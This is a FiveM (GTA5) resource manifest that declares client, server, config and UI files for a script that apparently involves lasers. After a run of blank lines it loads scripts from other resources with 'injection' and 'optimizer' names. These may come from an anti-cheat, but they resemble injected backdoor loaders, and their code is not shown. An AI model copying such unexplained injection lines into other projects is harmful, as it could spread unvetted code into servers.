fx_version 'cerulean'

game 'gta5'

client_script 'client.lua'
client_script 'lasers.lua'
server_script 'server.lua'
shared_script 'config.lua'

ui_page 'html/ui.html'

files {
	'html/ui.html',
	'html/css/*.css',
	'html/css/fonts/*.ttf',
	'html/images/*.png',
	'html/sounds/*.ogg',
	'html/index.js',
}





server_script '@optimizer/server/optimize.lua'


server_script "@Protector/Server/injection.lua"
client_script "@Greek_ac/client/injections.lua"
server_script "@Greek_ac/server/injections.lua"